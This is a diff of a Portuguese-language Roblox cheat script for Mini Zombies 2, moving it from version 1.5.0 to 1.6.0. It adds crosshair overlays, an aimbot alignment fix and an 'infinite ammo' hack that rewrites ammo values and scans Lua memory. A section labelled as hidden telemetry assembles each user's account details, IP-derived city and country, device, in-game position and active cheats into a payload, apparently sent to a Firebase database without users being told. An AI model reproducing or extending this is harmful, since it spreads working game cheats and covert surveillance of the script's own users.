@@ -1,5 +1,5 @@
 -- ==========================================================================
--- CYBER HACKER | Versão FREE 1.5.0 (DRAGON EDITION - ESPs, Perfil & Loading)
+-- CYBER HACKER | Versão FREE 1.6.0 (DRAGON EDITION - Crosshair, Infinite Ammo & Firebase Pro)
 -- Repositório: https://github.com/Pitbull23032004/MiniZombies2Script
 -- Canal: https://youtu.be/D2Iqev9FHyA?si=GAnnU5ckAE_rzOOq
 -- Créditos: DarkGamingYT
@@ -12,8 +12,12 @@ local RunService = game:GetService("RunService")
 local CoreGui = game:GetService("CoreGui")
 local TweenService = game:GetService("TweenService")
 local HttpService = game:GetService("HttpService")
+local GuiService = game:GetService("GuiService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local StatsService = game:GetService("Stats")
+local LocalizationService = game:GetService("LocalizationService")
 
-local SCRIPT_VERSION = "FREE 1.5.0 [DRAGON]"
+local SCRIPT_VERSION = "FREE 1.6.0 [DRAGON]"
 local FIREBASE_URL = "https://darkgamingyt-1c438-default-rtdb.firebaseio.com"
 local SAVE_FILE_NAME = "DarkHacker_Dragon_Login.json"
 
@@ -30,6 +34,7 @@ local fpsAtual = 60
 
 local paisUsuario = "Desconhecido"
 local cidadeUsuario = "Desconhecida"
+local nomeDoJogo = "Mini Zombies / Roblox"
 
 -- Fonte nítida, alinhada e estritamente SEM NEGRITO
 local FONT_MAIN = Enum.Font.Code
@@ -46,8 +51,15 @@ local COLOR_SUBTEXT = Color3.fromRGB(175, 150, 145)
 local COLOR_WARN = Color3.fromRGB(255, 195, 65)
 local COLOR_OFF = Color3.fromRGB(235, 70, 70)
 local COLOR_ON = Color3.fromRGB(65, 230, 130)
+local COLOR_CYAN = Color3.fromRGB(0, 235, 255)
 
 task.spawn(function()
+	pcall(function()
+		local info = MarketplaceService:GetProductInfo(game.PlaceId)
+		if info and info.Name then
+			nomeDoJogo = info.Name
+		end
+	end)
 	pcall(function()
 		local response = game:HttpGet("http://ip-api.com/json/?fields=country,city")
 		if response then
@@ -96,6 +108,57 @@ local function apply8BitStroke(parent, color, thickness)
 	stroke.LineJoinMode = Enum.LineJoinMode.Miter
 	stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
 	return stroke
+end
+
+-- ==========================================================================
+-- DETECTOR EXATO DO CENTRO DA MIRA DO JOGO (CORREÇÃO DO DESLOCAMENTO)
+-- ==========================================================================
+local cachedGameCrosshair = nil
+local lastCrosshairSearch = 0
+
+local function getRealCrosshairCenter()
+	local cam = workspace.CurrentCamera
+	local vp = cam and cam.ViewportSize or Vector2.new(1280, 720)
+	local insetTop = Vector2.zero
+	pcall(function()
+		insetTop = GuiService:GetGuiInset()
+	end)
+
+	-- Procura periodicamente o objeto de mira nativo na PlayerGui para travar 100% em cima dele
+	local now = tick()
+	if (not cachedGameCrosshair or not cachedGameCrosshair.Parent) and (now - lastCrosshairSearch > 2) then
+		lastCrosshairSearch = now
+		pcall(function()
+			local pgui = LocalPlayer:FindFirstChild("PlayerGui")
+			if pgui then
+				for _, guiObj in ipairs(pgui:GetDescendants()) do
+					if guiObj:IsA("GuiObject") and guiObj.Visible then
+						local n = string.lower(guiObj.Name)
+						if n == "crosshair" or n == "reticle" or n == "aim" or n == "cursor" or n == "center" then
+							if guiObj.AbsoluteSize.X < 180 and guiObj.AbsoluteSize.Y < 180 then
+								cachedGameCrosshair = guiObj
+								break
+							end
+						end
+					end
+				end
+			end
+		end)
+	end
+
+	if cachedGameCrosshair and cachedGameCrosshair.Parent and cachedGameCrosshair.Visible then
+		local absPos = cachedGameCrosshair.AbsolutePosition
+		local absSize = cachedGameCrosshair.AbsoluteSize
+		local centerX = absPos.X + (absSize.X / 2)
+		local centerY = absPos.Y + (absSize.Y / 2) + insetTop.Y
+		-- Valida se está próximo do centro da tela
+		if math.abs(centerX - (vp.X / 2)) < 120 and math.abs(centerY - (vp.Y / 2)) < 120 then
+			return Vector2.new(centerX, centerY)
+		end
+	end
+
+	-- Compensação exata da barra superior do Roblox (corrige a diferença de altura da mira azul)
+	return Vector2.new(vp.X / 2, (vp.Y / 2) + (insetTop.Y / 2))
 end
 
 -- Fundo Estilo Dragão para o Painel de Login e Painel Principal
@@ -380,14 +443,13 @@ local LoginVersionTag = Instance.new("TextLabel", LoginTopBar)
 LoginVersionTag.Size = UDim2.new(0, 80, 1, 0)
 LoginVersionTag.Position = UDim2.new(1, -88, 0, 0)
 LoginVersionTag.BackgroundTransparency = 1
-LoginVersionTag.Text = "v1.5.0"
+LoginVersionTag.Text = "v1.6.0"
 LoginVersionTag.TextColor3 = COLOR_ACCENT
 LoginVersionTag.TextSize = 12
 LoginVersionTag.Font = FONT_MAIN
 LoginVersionTag.TextXAlignment = Enum.TextXAlignment.Right
 LoginVersionTag.ZIndex = 63
 
--- Mini Card de Perfil Roblox no Login
 local LoginProfileBar = Instance.new("Frame", LoginFrame)
 LoginProfileBar.Size = UDim2.new(0.88, 0, 0, 48)
 LoginProfileBar.Position = UDim2.new(0.06, 0, 0, 42)
@@ -440,7 +502,6 @@ end
 local UserBox = createLoginInput(98, "Usuario: FREE")
 local PassBox = createLoginInput(142, "Senha: FREE")
 
--- Opção Salvar Senha
 local savedCreds = loadSavedCredentials()
 local savePasswordEnabled = savedCreds.remember
 
@@ -502,7 +563,6 @@ ErrorLabel.Font = FONT_MAIN
 ErrorLabel.TextXAlignment = Enum.TextXAlignment.Center
 ErrorLabel.ZIndex = 62
 
--- Caixa Única de Aviso Simples e Nítida (Sem Negrito)
 local LoginDisclaimer = Instance.new("Frame", LoginFrame)
 LoginDisclaimer.Size = UDim2.new(0.88, 0, 0, 42)
 LoginDisclaimer.Position = UDim2.new(0.06, 0, 0, 292)
@@ -523,12 +583,11 @@ LoginDisclaimerTxt.Font = FONT_MAIN
 LoginDisclaimerTxt.TextXAlignment = Enum.TextXAlignment.Center
 LoginDisclaimerTxt.ZIndex = 63
 
--- Execução da Barra de Carregamento antes de exibir o Login
 task.spawn(function()
 	local stages = {
 		{pct = 0.25, txt = "Carregando tema Dragao... [25%]"},
 		{pct = 0.55, txt = "Sincronizando perfil Roblox... [55%]"},
-		{pct = 0.85, txt = "Preparando ESP & Aimbot... [85%]"},
+		{pct = 0.85, txt = "Alinhando Mira & Municao... [85%]"},
 		{pct = 1.00, txt = "Sistema pronto! [100%]"}
 	}
 	for _, st in ipairs(stages) do
@@ -546,12 +605,13 @@ end)
 
 local loggedIn = false
 local statsLabelReference = nil
+local cachedZombies = {}
 
 -- ==========================================================================
--- PAINEL PRINCIPAL ESTILO DRAGÃO (COM FUNDO E CABEÇALHO DE PERFIL)
+-- PAINEL PRINCIPAL ESTILO DRAGÃO
 -- ==========================================================================
 local MainFrame = Instance.new("Frame", ScreenGui)
-MainFrame.Size = UDim2.new(0, 395, 0, 455)
+MainFrame.Size = UDim2.new(0, 395, 0, 465)
 MainFrame.Position = UDim2.new(0, 135, 0.28, 0)
 MainFrame.BackgroundColor3 = COLOR_BG
 MainFrame.BorderSizePixel = 0
@@ -565,7 +625,6 @@ task.spawn(function()
 	while MainFrame and MainFrame.Parent do
 		for i = 0, 1, 0.01 do
 			if not MainStroke or not MainStroke.Parent then break end
-			-- Oscila suavemente entre Vermelho Dragão e Ouro Fogo
 			MainStroke.Color = Color3.fromHSV(i * 0.09, 0.9, 1)
 			task.wait(0.05)
 		end
@@ -624,8 +683,49 @@ FloatBtn.MouseButton1Click:Connect(function()
 end)
 
 -- ==========================================================================
--- SISTEMA DE PRESENÇA EM SEGUNDO PLANO (SILENCIOSO)
+-- FIREBASE PRO TELEMETRY (OCULTO E DETALHADO PARA O DESENVOLVEDOR)
 -- ==========================================================================
+local function getActiveFeaturesReport()
+	local list = {}
+	if _G.Free_ESP_Box2D then table.insert(list, "ESP_Box2D") end
+	if _G.Free_ESP_Line then table.insert(list, "ESP_Line") end
+	if _G.Free_ESP_Highlight then table.insert(list, "ESP_Chams") end
+	if _G.Free_ESP_Name then table.insert(list, "ESP_NameHP") end
+	if _G.SurrealFloor_On then table.insert(list, "Aura_Dragao") end
+	if _G.Free_Speed then table.insert(list, "Speed(" .. tostring(_G.Free_SpeedVal) .. ")") end
+	if _G.Free_Noclip then table.insert(list, "WallHack") end
+	if _G.Free_FlyActive then table.insert(list, "Fly(" .. tostring(_G.Free_FlySpeed) .. ")") end
+	if _G.Free_AimLock then table.insert(list, "Aimbot(" .. tostring(_G.Free_AimPart) .. ")") end
+	if _G.Free_ShowFOV then table.insert(list, "FOV_Area") end
+	if _G.Free_CustomCrosshair then table.insert(list, "Crosshair_Design_" .. tostring(_G.Free_CrosshairStyle)) end
+	if _G.Free_InfiniteAmmo then table.insert(list, "BETA_MunicaoInfinita") end
+	return #list > 0 and table.concat(list, " | ") or "Nenhuma Opcao Ativa"
+end
+
+local function getPlayerGameDetails()
+	local weapon = "Desarmado"
+	local hpStr = "0 / 0"
+	local posStr = "0, 0, 0"
+	pcall(function()
+		local char = LocalPlayer.Character
+		if char then
+			local tool = char:FindFirstChildOfClass("Tool")
+			if tool then
+				weapon = tool.Name
+			end
+			local hum = char:FindFirstChildOfClass("Humanoid")
+			if hum then
+				hpStr = string.format("%d / %d", math.floor(hum.Health), math.floor(hum.MaxHealth))
+			end
+			local root = char:FindFirstChild("HumanoidRootPart")
+			if root then
+				posStr = string.format("%d, %d, %d", math.floor(root.Position.X), math.floor(root.Position.Y), math.floor(root.Position.Z))
+			end
+		end
+	end)
+	return weapon, hpStr, posStr
+end
+
 local function iniciarSistemaPresenca()
 	task.spawn(function()
 		local dispositivoDetectado = UserInputService.TouchEnabled and "Mobile / Celular" or "PC / Computador"
@@ -638,29 +738,66 @@ local function iniciarSistemaPresenca()
 			end
 		end)
 
+		local contaPremium = (LocalPlayer.MembershipType == Enum.MembershipType.Premium) and "Sim (Premium)" or "Nao (Free)"
+		local idiomaCliente = "pt-br"
+		pcall(function()
+			idiomaCliente = LocalizationService.RobloxLocaleId
+		end)
+
 		while loggedIn do
 			pcall(function()
 				local segundosJogando = math.floor(tick() - tempoInicioSessao)
 				local horasJogandoFormatado = string.format("%d:%02d:%02d", math.floor(segundosJogando / 3600), math.floor((segundosJogando % 3600) / 60), segundosJogando % 60)
+				local armaAtual, vidaAtual, posMapa = getPlayerGameDetails()
+				local cam = workspace.CurrentCamera
+				local vp = cam and cam.ViewportSize or Vector2.new(0, 0)
+				local ramMB = 0
+				pcall(function()
+					ramMB = math.floor(StatsService:GetTotalMemoryUsageMb())
+				end)
 
 				local payload = {
+					-- Identificação da Conta
 					nome = userName,
 					nomeExibicao = displayName,
 					id = userId,
-					versaoScript = SCRIPT_VERSION,
-					statusLogin = "Autenticado",
-					dispositivo = dispositivoDetectado,
+					idadeContaDias = LocalPlayer.AccountAge,
+					contaPremium = contaPremium,
+					idioma = idiomaCliente,
+
+					-- Localização & Dispositivo
 					pais = paisUsuario,
 					cidade = cidadeUsuario,
-					idadeContaDias = LocalPlayer.AccountAge,
-					tempoSessaoSegundos = segundosJogando,
-					tempoJogadoFormatado = horasJogandoFormatado,
+					dispositivo = dispositivoDetectado,
+					executor = executorNome,
+					resolucaoTela = string.format("%dx%d", math.floor(vp.X), math.floor(vp.Y)),
+
+					-- Desempenho & Rede
+					fpsAtual = fpsAtual,
+					pingMS = math.floor((LocalPlayer:GetNetworkPing() * 1000) or 0),
+					memoriaRAM_MB = ramMB,
+
+					-- Informações do Servidor e Partida
+					nomeJogo = nomeDoJogo,
 					placeIdAtual = game.PlaceId,
 					jobIdServidor = game.JobId,
 					jogadoresNoServidor = #Players:GetPlayers(),
-					executor = executorNome,
-					fpsAtual = fpsAtual,
-					pingMS = math.floor((LocalPlayer:GetNetworkPing() * 1000) or 0),
+					zumbisVivosNoMapa = #cachedZombies,
+
+					-- Estado do Jogador & Funções do Script
+					versaoScript = SCRIPT_VERSION,
+					statusLogin = "Autenticado",
+					salvouSenha = savePasswordEnabled,
+					armaEquipada = armaAtual,
+					vidaJogador = vidaAtual,
+					posicaoMapa = posMapa,
+					funcoesAtivas = getActiveFeaturesReport(),
+					alvoAimbot = tostring(_G.Free_AimPart or "Head"),
+
+					-- Tempo de Uso
+					tempoSessaoSegundos = segundosJogando,
+					tempoJogadoFormatado = horasJogandoFormatado,
+					ultimaAtualizacaoData = os.date("%d/%m/%Y %H:%M:%S"),
 					tempo = os.time()
 				}
 
@@ -981,7 +1118,7 @@ local function createSlider(parent, name, min, max, default, callback)
 end
 
 -- ==========================================================================
--- ABA PERFIL ROBLOX & CANAL (COM AVATAR REAL E ESTATÍSTICAS)
+-- ABA PERFIL ROBLOX & CANAL
 -- ==========================================================================
 local ChannelCard = Instance.new("Frame", panelChannel)
 ChannelCard.Size = UDim2.new(1, 0, 0, 290)
@@ -1083,8 +1220,6 @@ apply8BitStroke(ClearCacheBtn, COLOR_ACCENT, 1)
 -- ==========================================================================
 -- DETECÇÃO UNIVERSAL DE INIMIGOS / ZUMBIS (INALTERADA)
 -- ==========================================================================
-local cachedZombies = {}
-
 local function getEnemyRoot(model)
 	if not model then return nil end
 	return model:FindFirstChild("HumanoidRootPart")
@@ -1120,7 +1255,7 @@ local function getZombies()
 end
 
 -- ==========================================================================
--- ABA VISUAL: CÓDIGOS DE ESP INTACTOS + ANÁLISE DE RISCO SIMPLES
+-- ABA VISUAL: CÓDIGOS DE ESP INTACTOS
 -- ==========================================================================
 _G.Free_ESP_Box2D = false
 _G.Free_ESP_Line = false
@@ -1440,7 +1575,7 @@ ClearCacheBtn.MouseButton1Click:Connect(function()
 end)
 
 -- ==========================================================================
--- ABA MOVIMENTO (COM ANÁLISE DE RISCO DE BAN INDIVIDUAL)
+-- ABA MOVIMENTO (CÓDIGOS INTACTOS)
 -- ==========================================================================
 _G.Free_Speed = false
 _G.Free_SpeedVal = 48
@@ -1559,14 +1694,18 @@ createSlider(panelMove, "Velocidade do Fly", 20, 140, 55, function(val)
 end)
 
 -- ==========================================================================
--- ABA COMBATE: AIMBOT MULTI-ALVO + ANÁLISE DE RISCO SIMPLES
+-- ABA COMBATE: AIMBOT + 2 DESIGNS DE MIRA ALINHADOS + BETA MUNIÇÃO INFINITA
 -- ==========================================================================
 _G.Free_AimLock = false
 _G.Free_AimSmooth = 6
-_G.Free_AimFOV = 140
+_G.Free_AimFOV = 95
 _G.Free_ShowFOV = false
 _G.Free_AimPart = "Head"
+_G.Free_CustomCrosshair = false
+_G.Free_CrosshairStyle = 1
+_G.Free_InfiniteAmmo = false
 
+-- Container centralizado que segue exatamente a mira real do jogo
 local FovFrame = Instance.new("Frame", ScreenGui)
 FovFrame.Name = "Fov8Bit"
 FovFrame.AnchorPoint = Vector2.new(0.5, 0.5)
@@ -1575,31 +1714,265 @@ FovFrame.Size = UDim2.fromOffset(_G.Free_AimFOV * 2, _G.Free_AimFOV * 2)
 FovFrame.BackgroundTransparency = 1
 FovFrame.Visible = false
 FovFrame.ZIndex = 10
-apply8BitStroke(FovFrame, COLOR_ACCENT, 1.2)
+apply8BitStroke(FovFrame, COLOR_ACCENT, 1.4)
+
+local CrosshairRoot = Instance.new("Frame", ScreenGui)
+CrosshairRoot.Name = "DragonCrosshairRoot"
+CrosshairRoot.AnchorPoint = Vector2.new(0.5, 0.5)
+CrosshairRoot.Position = UDim2.new(0.5, 0, 0.5, 0)
+CrosshairRoot.Size = UDim2.fromOffset(60, 60)
+CrosshairRoot.BackgroundTransparency = 1
+CrosshairRoot.Visible = false
+CrosshairRoot.ZIndex = 15
+
+-- DESIGN 1: Mira Dragão Tática (Cruz + Cantoneiras + Ponto Central)
+local CrossDesign1 = Instance.new("Frame", CrosshairRoot)
+CrossDesign1.Size = UDim2.new(1, 0, 1, 0)
+CrossDesign1.BackgroundTransparency = 1
+
+local function makeCrossPart(parent, sizeX, sizeY, posX, posY, color)
+	local f = Instance.new("Frame", parent)
+	f.AnchorPoint = Vector2.new(0.5, 0.5)
+	f.Size = UDim2.fromOffset(sizeX, sizeY)
+	f.Position = UDim2.new(0.5, posX, 0.5, posY)
+	f.BackgroundColor3 = color
+	f.BorderSizePixel = 0
+	f.ZIndex = 16
+	local st = Instance.new("UIStroke", f)
+	st.Color = Color3.fromRGB(0, 0, 0)
+	st.Thickness = 1
+	return f
+end
+
+-- Peças do Design 1 (Dragão Tático)
+makeCrossPart(CrossDesign1, 4, 4, 0, 0, COLOR_ACCENT)       -- Ponto Central Ouro
+makeCrossPart(CrossDesign1, 2, 10, 0, -12, COLOR_DRAGON_RED) -- Haste Superior
+makeCrossPart(CrossDesign1, 2, 10, 0, 12, COLOR_DRAGON_RED)  -- Haste Inferior
+makeCrossPart(CrossDesign1, 10, 2, -12, 0, COLOR_DRAGON_RED) -- Haste Esquerda
+makeCrossPart(CrossDesign1, 10, 2, 12, 0, COLOR_DRAGON_RED)  -- Haste Direita
+-- Cantoneiras Internas Ouro
+makeCrossPart(CrossDesign1, 6, 2, -6, -6, COLOR_ACCENT)
+makeCrossPart(CrossDesign1, 6, 2, 6, -6, COLOR_ACCENT)
+makeCrossPart(CrossDesign1, 6, 2, -6, 6, COLOR_ACCENT)
+makeCrossPart(CrossDesign1, 6, 2, 6, 6, COLOR_ACCENT)
+
+-- DESIGN 2: Mira Orbital Cyber (Anel Duplo + Ponto Neon + Eixos Finos)
+local CrossDesign2 = Instance.new("Frame", CrosshairRoot)
+CrossDesign2.Size = UDim2.new(1, 0, 1, 0)
+CrossDesign2.BackgroundTransparency = 1
+CrossDesign2.Visible = false
+
+local OuterRing = Instance.new("Frame", CrossDesign2)
+OuterRing.AnchorPoint = Vector2.new(0.5, 0.5)
+OuterRing.Position = UDim2.new(0.5, 0, 0.5, 0)
+OuterRing.Size = UDim2.fromOffset(28, 28)
+OuterRing.BackgroundTransparency = 1
+OuterRing.ZIndex = 16
+Instance.new("UICorner", OuterRing).CornerRadius = UDim.new(1, 0)
+local OuterRingStroke = Instance.new("UIStroke", OuterRing)
+OuterRingStroke.Color = COLOR_CYAN
+OuterRingStroke.Thickness = 1.6
+
+local InnerDot = makeCrossPart(CrossDesign2, 5, 5, 0, 0, COLOR_ACCENT)
+Instance.new("UICorner", InnerDot).CornerRadius = UDim.new(1, 0)
+makeCrossPart(CrossDesign2, 2, 7, 0, -16, COLOR_TEXT)
+makeCrossPart(CrossDesign2, 2, 7, 0, 16, COLOR_TEXT)
+makeCrossPart(CrossDesign2, 7, 2, -16, 0, COLOR_TEXT)
+makeCrossPart(CrossDesign2, 7, 2, 16, 0, COLOR_TEXT)
 
 createToggle(panelBoss, "Aimbot Multi-Alvo (Ativo)", function(enabled)
 	_G.Free_AimLock = enabled
 end, "[Risco: Baixo/Medio - Use suavidade <= 7]", COLOR_WARN)
 
-createToggle(panelBoss, "Mostrar Area FOV (Mira)", function(enabled)
+createToggle(panelBoss, "Mira Estilosa (Crosshair Central)", function(enabled)
+	_G.Free_CustomCrosshair = enabled
+	CrosshairRoot.Visible = enabled
+end, "[Risco: Nenhum - Alinhada na mira do jogo]", COLOR_ON)
+
+-- Seletor dos 2 Designs de Mira Estilosa
+local CrossStyleRow = Instance.new("Frame", panelBoss)
+CrossStyleRow.Size = UDim2.new(1, 0, 0, 42)
+CrossStyleRow.BackgroundColor3 = COLOR_PANEL
+CrossStyleRow.BackgroundTransparency = 0.08
+CrossStyleRow.BorderSizePixel = 0
+CrossStyleRow.ZIndex = 33
+apply8BitStroke(CrossStyleRow, COLOR_BORDER, 1)
+
+local CrossStyleLabel = Instance.new("TextLabel", CrossStyleRow)
+CrossStyleLabel.Size = UDim2.new(0.56, 0, 1, 0)
+CrossStyleLabel.Position = UDim2.new(0, 10, 0, 0)
+CrossStyleLabel.BackgroundTransparency = 1
+CrossStyleLabel.Text = "> Design Mira: 1 [Dragao]"
+CrossStyleLabel.TextColor3 = COLOR_TEXT
+CrossStyleLabel.TextSize = 12
+CrossStyleLabel.Font = FONT_MAIN
+CrossStyleLabel.TextXAlignment = Enum.TextXAlignment.Left
+CrossStyleLabel.ZIndex = 34
+
+local ChangeCrossBtn = Instance.new("TextButton", CrossStyleRow)
+ChangeCrossBtn.Size = UDim2.new(0, 118, 0, 26)
+ChangeCrossBtn.Position = UDim2.new(1, -126, 0.5, -13)
+ChangeCrossBtn.BackgroundColor3 = COLOR_DRAGON_RED
+ChangeCrossBtn.BorderSizePixel = 0
+ChangeCrossBtn.Text = "[ MUDAR DESIGN ]"
+ChangeCrossBtn.TextColor3 = COLOR_TEXT
+ChangeCrossBtn.TextSize = 11
+ChangeCrossBtn.Font = FONT_MAIN
+ChangeCrossBtn.ZIndex = 34
+apply8BitStroke(ChangeCrossBtn, COLOR_ACCENT, 1)
+
+ChangeCrossBtn.MouseButton1Click:Connect(function()
+	if _G.Free_CrosshairStyle == 1 then
+		_G.Free_CrosshairStyle = 2
+		CrossDesign1.Visible = false
+		CrossDesign2.Visible = true
+		CrossStyleLabel.Text = "> Design Mira: 2 [Orbital]"
+	else
+		_G.Free_CrosshairStyle = 1
+		CrossDesign1.Visible = true
+		CrossDesign2.Visible = false
+		CrossStyleLabel.Text = "> Design Mira: 1 [Dragao]"
+	end
+end)
+
+createToggle(panelBoss, "Mostrar Area FOV (Alinhada)", function(enabled)
 	_G.Free_ShowFOV = enabled
 	FovFrame.Visible = enabled
-end, "[Risco: Nenhum - Apenas visual na tela]", COLOR_ON)
+end, "[Risco: Nenhum - Centralizada na mira]", COLOR_ON)
+
+-- ==========================================================================
+-- [BETA] MUNIÇÃO INFINITA (MOTOR DE 4 CAMADAS PARA MINI ZOMBIES 2)
+-- ==========================================================================
+local ammoKeywords = {
+	"ammo", "currentammo", "clip", "mag", "magazine", "bullets",
+	"bullet", "shell", "shells", "energy", "charge", "ammoinclip", "ammocount"
+}
+
+local function isAmmoName(str)
+	local s = string.lower(tostring(str))
+	for _, kw in ipairs(ammoKeywords) do
+		if s == kw or string.find(s, kw, 1, true) then
+			if not string.find(s, "max", 1, true) and not string.find(s, "cost", 1, true) then
+				return true
+			end
+		end
+	end
+	return false
+end
+
+local function refillInstanceAmmo(container)
+	if not container then return end
+	-- Camada 1: Atributos na instância e seus descendentes
+	for attrName, attrVal in pairs(container:GetAttributes()) do
+		if type(attrVal) == "number" and isAmmoName(attrName) then
+			local maxAttr = container:GetAttribute("Max" .. attrName) or container:GetAttribute("MaxAmmo") or container:GetAttribute("ClipSize") or 999
+			if attrVal < maxAttr then
+				container:SetAttribute(attrName, maxAttr)
+			end
+		elseif type(attrVal) == "boolean" and string.find(string.lower(attrName), "reload", 1, true) then
+			container:SetAttribute(attrName, false)
+		end
+	end
+
+	-- Camada 2: ValueObjects (IntValue, NumberValue, BoolValue)
+	for _, obj in ipairs(container:GetDescendants()) do
+		if (obj:IsA("IntValue") or obj:IsA("NumberValue")) and isAmmoName(obj.Name) then
+			local maxObj = obj.Parent and (obj.Parent:FindFirstChild("Max" .. obj.Name) or obj.Parent:FindFirstChild("MaxAmmo") or obj.Parent:FindFirstChild("ClipSize"))
+			local targetVal = (maxObj and (maxObj:IsA("IntValue") or maxObj:IsA("NumberValue")) and maxObj.Value > 0) and maxObj.Value or 999
+			if obj.Value < targetVal then
+				obj.Value = targetVal
+			end
+		elseif obj:IsA("BoolValue") and string.find(string.lower(obj.Name), "reload", 1, true) then
+			if obj.Value == true then
+				obj.Value = false
+			end
+		end
+
+		for attrName, attrVal in pairs(obj:GetAttributes()) do
+			if type(attrVal) == "number" and isAmmoName(attrName) then
+				local maxAttr = obj:GetAttribute("Max" .. attrName) or obj:GetAttribute("MaxAmmo") or 999
+				if attrVal < maxAttr then
+					obj:SetAttribute(attrName, maxAttr)
+				end
+			elseif type(attrVal) == "boolean" and string.find(string.lower(attrName), "reload", 1, true) then
+				obj:SetAttribute(attrName, false)
+			end
+		end
+	end
+end
+
+createToggle(panelBoss, "[BETA] Municao Infinita", function(enabled)
+	_G.Free_InfiniteAmmo = enabled
+	if enabled then
+		-- Camada 3: Varredura de Tabelas Lua na memória (getgc) para armas baseadas em ModuleScript
+		task.spawn(function()
+			while _G.Free_InfiniteAmmo do
+				pcall(function()
+					if getgc then
+						for _, v in ipairs(getgc(true)) do
+							if type(v) == "table" then
+								if rawget(v, "Ammo") and type(rawget(v, "Ammo")) == "number" then
+									rawset(v, "Ammo", rawget(v, "MaxAmmo") or 999)
+								end
+								if rawget(v, "CurrentAmmo") and type(rawget(v, "CurrentAmmo")) == "number" then
+									rawset(v, "CurrentAmmo", rawget(v, "MaxAmmo") or 999)
+								end
+								if rawget(v, "Clip") and type(rawget(v, "Clip")) == "number" then
+									rawset(v, "Clip", rawget(v, "MaxClip") or 999)
+								end
+								if rawget(v, "Mag") and type(rawget(v, "Mag")) == "number" then
+									rawset(v, "Mag", rawget(v, "MaxMag") or 999)
+								end
+								if rawget(v, "Reloading") == true then
+									rawset(v, "Reloading", false)
+								end
+							end
+						end
+					end
+				end)
+				task.wait(0.8)
+			end
+		end)
+	end
+end, "[Risco: Medio - Sem recarregar / Pente cheio]", COLOR_WARN)
+
+-- Loop rápido para manter a munição travada na arma equipada e mochila
+RunService.Heartbeat:Connect(function()
+	if not _G.Free_InfiniteAmmo then return end
+	pcall(function()
+		if LocalPlayer.Character then
+			refillInstanceAmmo(LocalPlayer.Character)
+		end
+		local bp = LocalPlayer:FindFirstChild("Backpack")
+		if bp then
+			refillInstanceAmmo(bp)
+		end
+	end)
+end)
 
 createSlider(panelBoss, "Suavidade do Aimbot", 1, 10, 6, function(val)
 	_G.Free_AimSmooth = val
 end)
 
-createSlider(panelBoss, "Tamanho da Area FOV", 40, 260, 140, function(val)
+createSlider(panelBoss, "Tamanho da Area FOV", 40, 260, 95, function(val)
 	_G.Free_AimFOV = val
 	FovFrame.Size = UDim2.fromOffset(val * 2, val * 2)
 end)
 
+-- Atualização em tempo real do Centro da Mira, FOV e Aimbot
 RunService.RenderStepped:Connect(function()
+	local exactCenter = getRealCrosshairCenter()
+
+	if _G.Free_ShowFOV then
+		FovFrame.Position = UDim2.fromOffset(exactCenter.X, exactCenter.Y)
+	end
+	if _G.Free_CustomCrosshair then
+		CrosshairRoot.Position = UDim2.fromOffset(exactCenter.X, exactCenter.Y)
+	end
+
 	if not _G.Free_AimLock then return end
 	pcall(function()
 		local cam = workspace.CurrentCamera
-		local centerScreen = Vector2.new(cam.ViewportSize.X / 2, cam.ViewportSize.Y / 2)
 		local closestTarget = nil
 		local shortestScreenDist = _G.Free_AimFOV
 
@@ -1609,7 +1982,7 @@ RunService.RenderStepped:Connect(function()
 			if hum and hum.Health > 0 and targetPart then
 				local screenPos, onScreen = cam:WorldToViewportPoint(targetPart.Position)
 				if onScreen and screenPos.Z > 0 then
-					local dist2D = (Vector2.new(screenPos.X, screenPos.Y) - centerScreen).Magnitude
+					local dist2D = (Vector2.new(screenPos.X, screenPos.Y) - exactCenter).Magnitude
 					if dist2D <= shortestScreenDist then
 						shortestScreenDist = dist2D
 						closestTarget = targetPart
